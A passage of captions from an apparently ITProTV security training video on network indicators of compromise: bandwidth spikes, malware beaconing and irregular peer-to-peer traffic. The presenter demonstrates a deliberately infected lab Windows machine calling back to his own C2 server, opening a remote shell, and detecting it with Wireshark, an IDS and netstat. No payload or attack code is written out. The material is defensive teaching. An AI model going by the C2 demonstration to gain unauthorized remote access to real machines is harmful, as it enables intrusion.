those\n\n73\n00:03:51.453 --> 00:03:56.490\nworms, they typically are trying to do\nas much damage as they possibly can.\n\n74\n00:03:56.490 --> 00:03:59.462\nAnd replicate themselves,\nwhich can take up some bandwidth.\n\n75\n00:03:59.462 --> 00:04:04.340\nAnd also you gotta think about maybe\na command and control server, a C2 or C&amp;C,\n\n76\n00:04:04.340 --> 00:04:08.313\nwhichever one you like to go with,\nmost people say C2, I think.\n\n77\n00:04:08.313 --> 00:04:12.539\nAnd they're sending information back and\nforth between it,\n\n78\n00:04:12.539 --> 00:04:15.160\nand the compromised machine.\n\n79\n00:04:15.160 --> 00:04:19.871\nAnd if it's maybe having it download\nsomething or upload something.\n\n80\n00:04:19.871 --> 00:04:25.246\nAgain, maybe not data ex-filtration,\nper se, but the moving of large\n\n81\n00:04:25.246 --> 00:04:31.253\nfiles would definitely show up on those\nnetwork bandwidth utilization charts.\n\n82\n00:04:31.253 --> 00:04:35.065\nAnd saying, hey, post A over here is\nreally sucking up the bandwidth today,\n\n83\n00:04:35.065 --> 00:04:36.012\nwhat's going on?\n\n84\n00:04:36.012 --> 00:04:38.531\nSo again, that leads us to the symptom,\n\n85\n00:04:38.531 --> 00:04:41.802\nwe've seen the symptom\nnetwork bandwidth is high.\n\n86\n00:04:41.802 --> 00:04:43.782\nHow did we spot that?\n\n87\n00:04:43.782 --> 00:04:46.371\nWell, we're using things like Netflow.\n\n88\n00:04:46.371 --> 00:04:51.363\nWe are doing some sort of monitoring\nof the network in some shape or form.\n\n89\n00:04:51.363 --> 00:04:56.217\nTypically through systems like Nagios or\nSolarwinds,\n\n90\n00:04:56.217 --> 00:05:01.904\nwhere we set up our entire network\nto give us this data at a glance.\n\n91\n00:05:01.904 --> 00:05:07.543\nThe centralized monitoring services\nthat we can grab a hold of and say,\n\n92\n00:05:07.543 --> 00:05:13.204\nI've noticed that the network utilization\ndial is hammered over on the red.\n\n93\n00:05:13.204 --> 00:05:16.222\nWhat's going on, let me take a look and\nthen you click on that and you see.\n\n94\n00:05:16.222 --> 00:05:20.661\nMaybe you've even setup thresholds for\nalerts to say,\n\n95\n00:05:20.661 --> 00:05:25.478\nif I get into this much network bandwidth,\nsend me an alert,\n\n96\n00:05:25.478 --> 00:05:29.175\nas they used to say,\nhit me on the hip, right.\n\n97\n00:05:29.175 --> 00:05:32.402\nGive me a text,\nsend me an email, send both.\n\n98\n00:05:32.402 --> 00:05:36.512\nNotify someone that these things are\nhappening so that I can investigate more,\n\n99\n00:05:36.512 --> 00:05:39.843\nbecause this might be the indication\nof something going wrong.\n\n100\n00:05:39.843 --> 00:05:42.057\nThere could be some malware,\n\n101\n00:05:42.057 --> 00:05:46.890\nmaybe someone has actually have\ndone maybe a browser attack.\n\n102\n00:05:46.890 --> 00:05:49.954\nHas gained remote access to a system,\nor something like that and\n\n103\n00:05:49.954 --> 00:05:52.063\nthat is causing a lot\nof network bandwidth.\n\n104\n00:05:52.063 --> 00:05:54.692\nI wanna see what's going on,\nwhat is this traffic that's happening?\n\n105\n00:05:54.692 --> 00:05:57.900\nSo you wanna take a closer look.\n\n106\n00:05:57.900 --> 00:05:58.823\nWhat can we do?\n\n107\n00:05:58.823 --> 00:06:02.519\nWell we can set up those quality of\nservice rules saying if you reach\n\n108\n00:06:02.519 --> 00:06:06.691\nthis threshold, don't only just send\nme an alert but also cap it, right.\n\n109\n00:06:06.691 --> 00:06:08.962\nOnly allow x amount of\ndata to go through there.\n\n110\n00:06:08.962 --> 00:06:12.790\nIf you reach there, drop them down\nto x amount of level until we\n\n111\n00:06:12.790 --> 00:06:17.744\nhave further investigated to make sure\nthey just weren't torrenting at work.\n\n112\n00:06:17.744 --> 00:06:22.559\nAnd I need to go and say, hey, the\nnetwork's not for you to download season\n\n113\n00:06:22.559 --> 00:06:24.580\nfour of silicone valley.\n&gt;&gt; [LAUGH]\n\n114\n00:06:24.580 --> 00:06:26.554\n&gt;&gt; It's for you to do work on and\n\n115\n00:06:26.554 --> 00:06:29.443\nthat's a no no we don't do those things.\n\n116\n00:06:29.443 --> 00:06:31.636\nBut you could walk over to a user and\nthem go, yeah,\n\n117\n00:06:31.636 --> 00:06:33.831\nI noticed that my computer\nwas a little slow today,\n\n118\n00:06:33.831 --> 00:06:37.065\nas a matter of fact now that you say\nthat and I haven't been doing anything.\n\n119\n00:06:37.065 --> 00:06:39.624\nBut they've had a compromise under, and\n\n120\n00:06:39.624 --> 00:06:42.631\nnow we've got to investigate\na little further.\n\n121\n00:06:42.631 --> 00:06:46.247\nGo into our antivirus, antimalware,\nremediate the problem and\n\n122\n00:06:46.247 --> 00:06:49.151\nstart looking for it there,\nthat's what we can do.\n\n123\n00:06:49.151 --> 00:06:54.204\nWe can also do blocking the IP, so if it's\na denial of service that's happening,\n\n124\n00:06:54.204 --> 00:06:59.353\nI can see, that's coming from a specific\narea, I can block off that IP range.\n\n125\n00:06:59.353 --> 00:07:04.001\nOr if it's coming from transient traffic,\nmaybe I'll block the service for a while.\n\n126\n00:07:04.001 --> 00:07:05.357\nI might do other things,\n\n127\n00:07:05.357 --> 00:07:10.073\nmaybe I'll use Web application firewall\nif it's my website that's being hammered,\n\n128\n00:07:10.073 --> 00:07:13.642\nto say this type of traffic needs\nto be filtered and gone through.\n\n129\n00:07:13.642 --> 00:07:17.310\nWe actually had that happen at ITProTV and\nwe just implemented a capture,\n\n130\n00:07:17.310 --> 00:07:17.933\n&gt;&gt; Mm-hm.\n\n131\n00:07:17.933 --> 00:07:19.002\n&gt;&gt; For our login page, and\n\n132\n00:07:19.002 --> 00:07:20.240\nit worked out really well.\n\n133\n00:07:20.240 --> 00:07:23.215\nAnd our web application firewall\nsensed that it was happening,\n\n134\n00:07:23.215 --> 00:07:24.434\nhelped us put a stop to it.\n\n135\n00:07:24.434 --> 00:07:28.849\nAnd now we have even increased our\nWAFs capabilities to see it and\n\n136\n00:07:28.849 --> 00:07:32.793\nstop it without having to use the very,\nvery cool stuff.\n\n137\n00:07:32.793 --> 00:07:37.342\nAll right, so let's talk beaconing,\nbeaconing's an interesting thing.\n\n138\n00:07:37.342 --> 00:07:41.884\nAgain, this goes back to malware, all\nroads lead to malware apparently [LAUGH].\n\n139\n00:07:41.884 --> 00:07:42.707\n&gt;&gt; [LAUGH] Yes, they do.\n\n140\n00:07:42.707 --> 00:07:44.558\n&gt;&gt; When it comes to indications of\n\n141\n00:07:44.558 --> 00:07:45.416\ncompromise.\n\n142\n00:07:45.416 --> 00:07:50.536\nSo beaconing is something that, when\nyou have malware on a system that wants\n\n143\n00:07:50.536 --> 00:07:56.140\nto talk back to it's, some people call it\na rat, these are remote access trojans.\n\n144\n00:07:56.140 --> 00:08:00.373\nThey get installed on these machines and\nthey talk back to the C2 server.\n\n145\n00:08:00.373 --> 00:08:04.161\nRight, well maybe that\nC2 servers not online.\n\n146\n00:08:04.161 --> 00:08:04.742\nWhat does it do?\n\n147\n00:08:04.742 --> 00:08:10.255\nWell it starts sending requests\nperiodically to say, hey I'm here.\n\n148\n00:08:10.255 --> 00:08:12.544\nI've infected this machine.\n\n149\n00:08:12.544 --> 00:08:13.761\nI've compromised it, great.\n\n150\n00:08:13.761 --> 00:08:17.314\nI'm just waiting for you to initiate\nour connection so that you can send me\n\n151\n00:08:17.314 --> 00:08:20.810\ninformation that you want me to do.\n&gt;&gt; Malware phone home.\n\n152\n00:08:20.810 --> 00:08:23.760\n&gt;&gt; Yes [LAUGH] malware phone home.\n\n153\n00:08:23.760 --> 00:08:26.440\nIt's like an evil ET that\n\n154\n00:08:26.440 --> 00:08:29.650\ndoesn't want to like heal your\nfinger when you put it on a saw.\n\n155\n00:08:29.650 --> 00:08:32.040\nIt wants to saw you everywhere and\nsteal your data.\n\n156\n00:08:32.040 --> 00:08:34.080\nIt's a horrible, horrible thing right?\n\n157\n00:08:34.080 --> 00:08:38.811\nSo this beaconing idea could be\nhappening where it's just like I said\n\n158\n00:08:38.811 --> 00:08:43.791\nperiodically reaching out to the C2\nserver to see if it's available for\n\n159\n00:08:43.791 --> 00:08:45.246\ncommunications.\n&gt;&gt; And\n\n160\n00:08:45.246 --> 00:08:47.770\nhopefully we see that.\n&gt;&gt; Yes, it's the idea.\n\n161\n00:08:47.770 --> 00:08:49.170\nAnd how do we see that?\n\n162\n00:08:49.170 --> 00:08:52.965\nWell what's the,\nan indicator of that kind of compromise?\n\n163\n00:08:52.965 --> 00:08:55.014\nWell we're monitoring, right?\n\n164\n00:08:55.014 --> 00:08:58.604\nThis all comes down to the fact\nwe are logging and monitoring and\n\n165\n00:08:58.604 --> 00:09:01.124\nlooking at these things for regular basis.\n\n166\n00:09:01.124 --> 00:09:05.730\nAnd when we have areas in which we\nknow are going to be an indicator of\n\n167\n00:09:05.730 --> 00:09:10.110\ncompromise, we set up alerts for\nthat, or we block it or both.\n\n168\n00:09:11.910 --> 00:09:15.785\nSo I can kinda actually show you what\nbeaconing looks like because I've infected\n\n169\n00:09:15.785 --> 00:09:18.745\nmy Windows 10 machine that's looking\n&gt;&gt; Wait,\n\n170\n00:09:18.745 --> 00:09:20.327\nwhat network are you connected to?\n&gt;&gt; Yeah.\n\n171\n00:09:20.327 --> 00:09:20.875\n[LAUGH] Reset.\n\n172\n00:09:20.875 --> 00:09:22.984\nYeah, do you have the C2 server available,\nMike?\n\n173\n00:09:22.984 --> 00:09:27.915\n[LAUGH] And I specifically made\na phone home to my C2 server so\n\n174\n00:09:27.915 --> 00:09:31.225\neven if Mike was out there he would have\nto steal my IP address and all that stuff.\n\n175\n00:09:31.225 --> 00:09:34.045\nIt's a private network anyway, you\ncan't get [INAUDIBLE] Yeah, sorry MIke.\n\n176\n00:09:34.045 --> 00:09:36.165\nI know you wanted to have some fun,\nmaybe later.\n\n177\n00:09:36.165 --> 00:09:37.990\nMaybe later, right?\n&gt;&gt; [LAUGH]\n\n178\n00:09:37.990 --> 00:09:39.314\n&gt;&gt; It is a lot of fun.\n\n179\n00:09:39.314 --> 00:09:44.212\nSo right now it is looking for\nthat connection.I don't have my C2 server\n\n180\n00:09:44.212 --> 00:09:48.163\nrunning so that we'll see\nthe beaconing happening right?\n\n181\n00:09:48.163 --> 00:09:50.167\nAll we got to do is fire up Wireshark and\nlook at the information that comes across.\n\n182\n00:09:50.167 --> 00:09:55.140\nSo I will bring up Wireshark,and\nonce it gets rolling here,\n\n183\n00:09:55.140 --> 00:10:00.130\njust a second once I get my\nlittle error once I always do.\n\n184\n00:10:00.130 --> 00:10:02.510\nLIke a day without sunshine if\nI don't get that little error.\n\n185\n00:10:02.510 --> 00:10:06.380\nStart the capture on the correct\ninterface, and now I just start waiting.\n\n186\n00:10:06.380 --> 00:10:09.450\nI'm starting to see some\ninformation come across the wire.\n\n187\n00:10:09.450 --> 00:10:12.320\nAnd I'll just give it a minute\nto let it keep capturing.\n\n188\n00:10:12.320 --> 00:10:14.880\nJust get some good data so\nI can see what's going on.\n\n189\n00:10:14.880 --> 00:10:17.630\nDon't want to miss anything.\n\n190\n00:10:17.630 --> 00:10:20.600\nAnd I will go ahead and tell you I\nalready see the beaconing occurring.\n\n191\n00:10:20.600 --> 00:10:22.380\nIt happened right out of the gates.\n\n192\n00:10:22.380 --> 00:10:26.370\nSo looks like you might get a few more,\nthere we go, happened again.\n\n193\n00:10:26.370 --> 00:10:29.810\nI think that's good,\nwe had a couple of beacons happen.\n\n194\n00:10:29.810 --> 00:10:35.750\nSo this, I will zoom in so\nyou guys can see this.\n\n195\n00:10:35.750 --> 00:10:43.170\nYou'll see the source and destination\n55.157 to destination 225 over port 443.\n\n196\n00:10:43.170 --> 00:10:45.160\nNow this is typically how\nthe beaconing occurs.\n\n197\n00:10:45.160 --> 00:10:49.420\nIt usually uses HTTPS or SSL,\n\n198\n00:10:49.420 --> 00:10:55.370\nTLS ports because they're typically\nnot blocked by a firewall.\n\n199\n00:10:55.370 --> 00:10:57.830\nYou want that traffic to\nbe able to go through, so\n\n200\n00:10:57.830 --> 00:10:59.500\nI do have to be on the lookout for that.\n\n201\n00:10:59.500 --> 00:11:02.930\nIt also might be going over port 80,\nas well, so, but it doesn't have to.\n\n202\n00:11:02.930 --> 00:11:06.790\nIt's not necessary, but\nit is typical of a beaconing thing,\n\n203\n00:11:06.790 --> 00:11:09.890\nbecause usually,\nfirewalls aren't blocking support.\n\n204\n00:11:09.890 --> 00:11:12.140\nYou want people to be able\nto get to the Internet and\n\n205\n00:11:12.140 --> 00:11:14.760\nwe want you to be able to get\nto the Internet securely.\n\n206\n00:11:14.760 --> 00:11:17.500\nSo, those two ports are going\nto be open in our firewalls.\n\n207\n00:11:18.650 --> 00:11:22.620\nAnd I'm just seeing a reset\nwith an ACK happen.\n\n208\n00:11:22.620 --> 00:11:24.420\nWell, this actually happened\nafter the first pack,\n\n209\n00:11:24.420 --> 00:11:26.260\nhere's the first pack right here.\n\n210\n00:11:26.260 --> 00:11:30.652\nAnd we see it is that first SYN,\nthat starts that initiation,\n\n211\n00:11:30.652 --> 00:11:35.142\nthat three way handshake that we love so\nmuch over port 443.\n\n212\n00:11:35.142 --> 00:11:37.544\nBut it's not receiving anything so\nits resetting and\n\n213\n00:11:37.544 --> 00:11:39.509\nsending an acknowledgement, right?\n\n214\n00:11:39.509 --> 00:11:42.520\nOkay you're not there, great, that's fine.\n\n215\n00:11:42.520 --> 00:11:44.710\nAnd then you get a re-transmission, and\n\n216\n00:11:44.710 --> 00:11:47.250\nthen again the same thing\nhappening over and over.\n\n217\n00:11:47.250 --> 00:11:48.840\nThis is the beaconing thing happening.\n\n218\n00:11:48.840 --> 00:11:50.480\nHere it is again and\n\n219\n00:11:50.480 --> 00:11:54.018\nlet's see if we can see how long it took,\ndo we have time, time.\n\n220\n00:11:54.018 --> 00:11:57.610\nI don't know if I can\nshow this in normal time,\n\n221\n00:11:57.610 --> 00:12:01.155\nbut I assume this is in some for\nof nanoseconds or something here.\n\n222\n00:12:01.155 --> 00:12:04.460\n[CROSSTALK] It looked to\nbe about every 20 seconds.\n\n223\n00:12:04.460 --> 00:12:08.698\nI think that's about what it ran,\nabout every 20 seconds this thing is going\n\n224\n00:12:08.698 --> 00:12:11.282\nto beacon, and\nsee if the server is available.\n\n225\n00:12:11.282 --> 00:12:15.380\nAnd we will actually take a look\nat the connection being made.\n\n226\n00:12:15.380 --> 00:12:18.970\nIf not in this show,\nin the next show, to see how easy,\n\n227\n00:12:18.970 --> 00:12:21.939\nonce I started my server, the thing\nimmediately goes you have one session.\n\n228\n00:12:23.572 --> 00:12:27.270\nGreat that's because of that\nbeaconing happening, right?\n\n229\n00:12:27.270 --> 00:12:28.650\nSo that's a good way we can see that.\n\n230\n00:12:28.650 --> 00:12:33.006\nThat we are monitoring a network using\na protocol analyser, using a net-flow\n\n231\n00:12:33.006 --> 00:12:38.022\nsomething seeing interesting traffic that\nis happening that wasn't happening before.\n\n232\n00:12:38.022 --> 00:12:41.380\nSo we need things like\nbaselines that allow us to see.\n\n233\n00:12:42.890 --> 00:12:46.160\nThat's different than what I normally see,\nokay?\n\n234\n00:12:46.160 --> 00:12:47.360\nSo that will help us out with that.\n\n235\n00:12:48.560 --> 00:12:53.580\nCourse of action using IDSs and\nIPSs, this will help.\n\n236\n00:12:53.580 --> 00:13:00.560\nIt's funny, I think I've got the IDS\nrunning on my CentOS server.\n\n237\n00:13:00.560 --> 00:13:03.230\nI think it is actually picking\nup the beacons as well.\n\n238\n00:13:03.230 --> 00:13:06.250\nSo let's jump over there,\nI'll see, cuz I can't swear to it.\n\n239\n00:13:06.250 --> 00:13:07.148\nLet's check it out here.\n\n240\n00:13:07.148 --> 00:13:12.050\nLog in, and\n\n241\n00:13:12.050 --> 00:13:17.000\nso I am seeing 157 to 225\nover port 443 happening on my\n\n242\n00:13:17.000 --> 00:13:18.970\nIDS on this network.\n&gt;&gt; Wow.\n\n243\n00:13:18.970 --> 00:13:20.790\n&gt;&gt; So it is picking that up,\n\n244\n00:13:20.790 --> 00:13:23.270\nit is detecting it as a stealth scan.\n\n245\n00:13:23.270 --> 00:13:27.450\nBut I know something's going on and\nI need to investigate that.\n\n246\n00:13:27.450 --> 00:13:32.330\nCuz typically scans, and we're gonna get\ninto scans here in just a little bit, but\n\n247\n00:13:32.330 --> 00:13:36.180\nwhen scans occur they run and\nthere over with.\n\n248\n00:13:36.180 --> 00:13:37.840\nThis is continual scanning,\n\n249\n00:13:37.840 --> 00:13:42.340\nIt would garner my attention\na lot more than I'd see normally\n\n250\n00:13:42.340 --> 00:13:46.338\nin the logs if I saw a sin scan.\n&gt;&gt; Yeah and you being part of the IT or\n\n251\n00:13:46.338 --> 00:13:50.677\nsecurity team would know if there are any\nauthorized scans being run on the network.\n\n252\n00:13:50.677 --> 00:13:53.430\nThey're probably running them\nthemselves or somebody on your team.\n\n253\n00:13:53.430 --> 00:13:56.714\nSeeing a scan like this,\nas you said is definitely, hey,\n\n254\n00:13:56.714 --> 00:13:59.273\nwe need to do a little\nmore looking into this.\n\n255\n00:13:59.273 --> 00:14:02.723\nCuz either somebody on my network\nis running an unauthorized scan, or\n\n256\n00:14:02.723 --> 00:14:05.380\nthis is more than it seems to be.\n&gt;&gt; Exactly.\n\n257\n00:14:05.380 --> 00:14:09.020\nSo this is how we need to be\nfamiliar with our networks\n\n258\n00:14:09.020 --> 00:14:13.100\nthrough the course of monitoring,\ntaking baselines, setting up IDS and IPS.\n\n259\n00:14:13.100 --> 00:14:17.190\nAll these things come together\nto help us track down\n\n260\n00:14:17.190 --> 00:14:21.930\nwhere a probable hence,\nour indicator compromise might be.\n\n261\n00:14:21.930 --> 00:14:23.190\nAnd we see, we've got the source and\n\n262\n00:14:23.190 --> 00:14:25.570\ndestination right here,\nwhat port is being used.\n\n263\n00:14:25.570 --> 00:14:28.970\nAll the stuff that I'm\nseeing here is very sketchy.\n\n264\n00:14:30.080 --> 00:14:34.935\nAnd while I would have to adjust my rules\nto better pick up what is happening, and\n\n265\n00:14:34.935 --> 00:14:37.482\nI'll probably do that post-incident.\n\n266\n00:14:37.482 --> 00:14:43.190\nBut from here, at least I'm seeing,\nI thinks it's a nmask self scan, basically\n\n267\n00:14:43.190 --> 00:14:48.833\nbecause of the way that it is compacting\nport 4443 on the C2 server, right?\n\n268\n00:14:48.833 --> 00:14:51.097\nSo that's why it's picking up in stealth.\n\n269\n00:14:51.097 --> 00:14:54.282\nWith that being said,\nI would further investigate this.\n\n270\n00:14:54.282 --> 00:14:57.451\nAnd again if I do find that\nthat is infected with malware,\n\n271\n00:14:57.451 --> 00:15:01.340\nI go to that machine, and\ngo why are you doing this little machine?\n\n272\n00:15:01.340 --> 00:15:04.510\nAnd I realize,\nwe've got a malware infection right here.\n\n273\n00:15:04.510 --> 00:15:09.025\nI can do my DNS sinkholing, and then\nmove onto more remediation of any virus,\n\n274\n00:15:09.025 --> 00:15:12.022\nany malware running,\nquarantining the malware.\n\n275\n00:15:12.022 --> 00:15:14.930\nGetting it off-loaded from the machine and\neradicated.\n\n276\n00:15:14.930 --> 00:15:17.250\nPutting that system,\nmaybe even imaging it,\n\n277\n00:15:17.250 --> 00:15:20.420\nputting it back into the fray\nas a normal work machine.\n\n278\n00:15:20.420 --> 00:15:22.360\nThat being said, let's move on.\n\n279\n00:15:22.360 --> 00:15:25.610\nI think we've covered beaconing,\nyou guys get the idea, right?\n\n280\n00:15:25.610 --> 00:15:27.349\nLet's go back here,\nI'm gonna close this out.\n\n281\n00:15:28.680 --> 00:15:30.960\nAnd if i can [INAUDIBLE], okay, file.\n\n282\n00:15:34.882 --> 00:15:37.460\nAll right, moving on, where are we at now?\n\n283\n00:15:37.460 --> 00:15:40.210\nIrregular peer to peer communications.\n\n284\n00:15:42.200 --> 00:15:45.330\nWe definitely see this from time to time.\n\n285\n00:15:45.330 --> 00:15:48.600\nAgain, this could be innocuous.\n\n286\n00:15:48.600 --> 00:15:52.140\nBut if you see a communication that\nyou don't recognize, and again,\n\n287\n00:15:52.140 --> 00:15:53.041\nhow do we do this?\n\n288\n00:15:53.041 --> 00:15:57.443\nWe could do this through monitoring,\nIDS, IPS, firewalling, rules,\n\n289\n00:15:57.443 --> 00:15:58.792\nalerts, you name it.\n\n290\n00:15:58.792 --> 00:16:02.273\nAll these things come into play,\nto let us know something is happening.\n\n291\n00:16:02.273 --> 00:16:05.813\nAnd then we can further investigate to\nlook more specifically at the area of\n\n292\n00:16:05.813 --> 00:16:07.398\ncompromise that we're seeing.\n\n293\n00:16:07.398 --> 00:16:10.152\nWhat I'm going to do now is I actually\nam going to fire up that C2 server,\n\n294\n00:16:10.152 --> 00:16:11.416\nallow the connection to be made,\n\n295\n00:16:11.416 --> 00:16:14.370\nbecause that will be at a regular\npeer to peer communication.\n\n296\n00:16:14.370 --> 00:16:14.960\nLet's do that.\n\n297\n00:16:14.960 --> 00:16:17.550\nI have to go into my tools directory and\n\n298\n00:16:17.550 --> 00:16:20.580\nthen it's-\n&gt;&gt; And while you're doing that,\n\n299\n00:16:20.580 --> 00:16:24.220\nI like the you said that it's\nsomething that we want to look at,\n\n300\n00:16:24.220 --> 00:16:25.760\nnot necessarily a bad thing.\n\n301\n00:16:25.760 --> 00:16:28.950\nI might have I don't know,\n\n302\n00:16:28.950 --> 00:16:32.390\nmaybe I decided to move a virtual\nhard drive across the network.\n\n303\n00:16:32.390 --> 00:16:34.370\nNot something I normally do so\n\n304\n00:16:34.370 --> 00:16:38.880\nall the sudden there's this huge spike\nin bandwidth coming out of my machine.\n\n305\n00:16:38.880 --> 00:16:42.390\nYou notice that and\nyou do some investigating and\n\n306\n00:16:42.390 --> 00:16:44.180\nyou realize that it's harmless.\n\n307\n00:16:44.180 --> 00:16:47.800\nIt was just not normal but\nit's not anything bad.\n\n308\n00:16:47.800 --> 00:16:51.020\nSo sometimes it's not always malware,\nbut it's something\n\n309\n00:16:51.020 --> 00:16:54.340\nthat we have to investigate.\n&gt;&gt; That's exactly right, so whether or\n\n310\n00:16:54.340 --> 00:16:58.010\nnot it ends up being something bad or\nnot is beside the point.\n\n311\n00:16:58.010 --> 00:17:01.300\nIt's the idea that we've seen\nsomething that is an indication that\n\n312\n00:17:01.300 --> 00:17:02.530\nthere might be something bad.\n\n313\n00:17:02.530 --> 00:17:06.049\nIf we ignore these things,\nthen we're leaving ourselves open.\n\n314\n00:17:06.049 --> 00:17:09.677\nAnd then one day those stakeholders are\ngonna get called and we're gonna have to\n\n315\n00:17:09.677 --> 00:17:11.870\nexplain, why didn't we investigate this?\n&gt;&gt; Yeah.\n\n316\n00:17:11.870 --> 00:17:13.250\n&gt;&gt; They're going to be mad at you,\n\n317\n00:17:13.250 --> 00:17:15.296\nand you're gonna get to print your résumé,\nand\n\n318\n00:17:15.296 --> 00:17:18.387\nhope somebody doesn't care that your\nlast job you were released from.\n\n319\n00:17:18.387 --> 00:17:19.792\nSo very important thing.\n\n320\n00:17:19.792 --> 00:17:24.515\nNow you'll notice here at the bottom of\nour screen that I've started the server,\n\n321\n00:17:24.515 --> 00:17:25.750\nthe C2 server.\n\n322\n00:17:25.750 --> 00:17:30.638\nServer started on port 443 with\ntransport SSL and session one is opened.\n\n323\n00:17:30.638 --> 00:17:32.670\nI didn't do anything but start the server.\n\n324\n00:17:32.670 --> 00:17:38.420\nNow beaconing has worked, the session has\nbeen connected, now I'm in the machine.\n\n325\n00:17:38.420 --> 00:17:43.260\nI can run things like Shell, look at that,\nI'm in a Windows system now,\n\n326\n00:17:43.260 --> 00:17:45.880\nbecause it's the Windows\nsystem I have compromised.\n\n327\n00:17:45.880 --> 00:17:48.450\nI can do a who am I?\n\n328\n00:17:48.450 --> 00:17:51.950\nAnd see that I'm logged\nin as me right there.\n\n329\n00:17:51.950 --> 00:17:53.990\n&gt;&gt; If I had only seen that beaconing and\n\n330\n00:17:53.990 --> 00:17:56.910\ndone something about it before\nthat C2 server came online.\n\n331\n00:17:56.910 --> 00:17:57.490\n&gt;&gt; Exactly,\n\n332\n00:17:57.490 --> 00:17:59.490\nMike's head's in the right space on this.\n\n333\n00:17:59.490 --> 00:18:02.160\nSo let little weird things like that be\n\n334\n00:18:02.160 --> 00:18:05.500\nan impetus to move you into\nfurther investigation.\n\n335\n00:18:05.500 --> 00:18:08.530\nThis is what we call IOCs,\nindicators of compromise, and\n\n336\n00:18:08.530 --> 00:18:09.810\nit is done over the network.\n\n337\n00:18:09.810 --> 00:18:15.320\nNow, cool thing is I can jump over\nif I'm on this Windows machine and\n\n338\n00:18:15.320 --> 00:18:17.990\nI think something weird is going on,\nwhich it is.\n\n339\n00:18:17.990 --> 00:18:20.570\nThere we go, give me my mouse back.\n\n340\n00:18:20.570 --> 00:18:27.580\nAnd I come over here, let's say,\nlet's start a CMD here, fire that off.\n\n341\n00:18:27.580 --> 00:18:31.830\nWe can do good old netstat, right?\n\n342\n00:18:33.070 --> 00:18:35.175\nNetstat, let's fire it off.\n\n343\n00:18:35.175 --> 00:18:38.530\nMaybe I have to do a -a at it,\nmaybe it'll pick it up, maybe it won't.\n\n344\n00:18:38.530 --> 00:18:42.060\nI think I might using\n[INAUDIBLE] there we go.\n\n345\n00:18:42.060 --> 00:18:43.460\nThere we go, we're just kinda waiting.\n\n346\n00:18:43.460 --> 00:18:45.430\nI'm gonna kill that, Ctrl + C.\n\n347\n00:18:45.430 --> 00:18:47.950\nWe'll do an netstat -a, there we go.\n\n348\n00:18:49.460 --> 00:18:51.460\nAnd I'm going to let it do its thing.\n\n349\n00:18:51.460 --> 00:18:54.500\nRight now it's looking to all the open\nconnections in just one of the ways in\n\n350\n00:18:54.500 --> 00:18:56.290\nwhich we can investigate these things.\n\n351\n00:18:56.290 --> 00:18:58.860\nKinda gtting in there\nusing built-in tools.\n\n352\n00:18:58.860 --> 00:19:02.710\nBut, the thing that brought me here was\nthe fact that I saw something weird on\n\n353\n00:19:02.710 --> 00:19:03.210\nmy network.\n\n354\n00:19:03.210 --> 00:19:05.550\nLook at this communication\nbetween the two.\n\n355\n00:19:05.550 --> 00:19:10.430\nNow I can come to the machine,\nand I can look through and\n\n356\n00:19:10.430 --> 00:19:15.060\nwhat do I see here that says established,\nright?\n\n357\n00:19:15.060 --> 00:19:19.290\nSo just using good old netstat\n-a I was able to realize\n\n358\n00:19:19.290 --> 00:19:24.100\nI have an established\nconnection from this machine\n\n359\n00:19:24.100 --> 00:19:29.460\nover port 50097 to another\nmachine over HTTPS.\n\n360\n00:19:29.460 --> 00:19:31.458\nWell I don't see any browser open, right?\n\n361\n00:19:31.458 --> 00:19:34.862\nI can go into the processes,\nno Firefox, no Chrome,\n\n362\n00:19:34.862 --> 00:19:38.324\nno IE, no Edge.\n&gt;&gt; But if this wasn't a lab environment,\n\n363\n00:19:38.324 --> 00:19:42.054\nthat would most likely be a public address\nor some address you didn't recognize as\n\n364\n00:19:42.054 --> 00:19:46.690\nauthorized or should be on your network.\n&gt;&gt; Exactly, and if your IDS or IPS is\n\n365\n00:19:46.690 --> 00:19:52.280\ninvolved, you'll probably be able to say A\nlot of times malware domains are very well\n\n366\n00:19:52.280 --> 00:19:57.140\nknown and as they become more known we\nadd them to our list of malware domains.\n\n367\n00:19:57.140 --> 00:20:00.260\nAnd it would see that and go,\nthat's a malware domain, and\n\n368\n00:20:00.260 --> 00:20:04.250\nI stop my sync holding, I can start\nmy remediation process from there.\n\n369\n00:20:04.250 --> 00:20:09.110\nSo that's just, when I see this\nweird peer to peer traffic,\n\n370\n00:20:09.110 --> 00:20:12.000\nwhat is it that I need to be doing,\nand how does that look?\n\n371\n00:20:12.000 --> 00:20:13.800\nAnd hopefully you guys have seen this.\n\n372\n00:20:13.800 --> 00:20:19.870\nAgain, network monitoring, IDS IPS,\ntraffic capture and analysis.\n\n373\n00:20:19.870 --> 00:20:24.590\nThis is what's going to help us discover\nwhether this is legit traffic, or\n\n374\n00:20:24.590 --> 00:20:25.820\nnot legit traffic.\n\n375\n00:20:25.820 --> 00:20:28.020\nAnd then remediate the thing.\n\n376\n00:20:28.020 --> 00:20:29.970\nUsing baselines will\nhelp with this as well.\n\n377\n00:20:29.970 --> 00:20:32.990\nAgain, another fantastic way for us to go.\n\n378\n00:20:32.990 --> 00:20:33.870\nIs it still there?\n\n379\n00:20:33.870 --> 00:20:37.120\nWe used the same procedure that we'd use\nto discover it to verify that we have\n\n380\n00:20:37.120 --> 00:20:38.580\neradicated it.\n\n381\n00:20:38.580 --> 00:20:40.210\nI don't see that traffic anymore.\n\n382\n00:20:40.210 --> 00:20:41.700\nExcellent, it's gone.\n\n383\n00:20:41.700 --> 00:20:46.860\nYou can also use behavioristic or\nheuristic engines to discover,\n\n384\n00:20:46.860 --> 00:20:49.550\nsince this might not be\na well known signature.\n\n385\n00:20:49.550 --> 00:20:53.880\nSo heuristically, it might say,\nit's got the idea of\n\n386\n00:20:53.880 --> 00:20:57.123\nwhat malware looks like so\nI'm gonna go ahead and flag it.\n\n387\n00:20:57.123 --> 00:21:00.370\nNext gen firewalls and stuff like that\nare very good in this kind of thing.\n\n388\n00:21:00.370 --> 00:21:02.363\nAnd then you can just start\nblocking it firewalls,\n\n389\n00:21:02.363 --> 00:21:06.810\nlet it do the heavy lifting for you.\n\n390\n00:21:06.810 --> 00:21:11.089\nOkay, rouge devices on the network.\n\n391\n00:21:11.089 --> 00:21:13.280\nMan, these are the fun ones right here,\nMike.\n\n392\n00:21:13.280 --> 00:21:14.760\n&gt;&gt; Yeah they are.\n\n393\n00:21:14.760 --> 00:21:16.008\n&gt;&gt; I don't know how many of you out there\n\n394\n00:21:16.008 --> 00:21:17.625\nhave experience this\nI've experienced this.\n\n395\n00:21:17.625 --> 00:21:19.940\nPeople bring in devices from home.\n\n396\n00:21:19.940 --> 00:21:22.381\nPeople bring in wireless\naccess points from 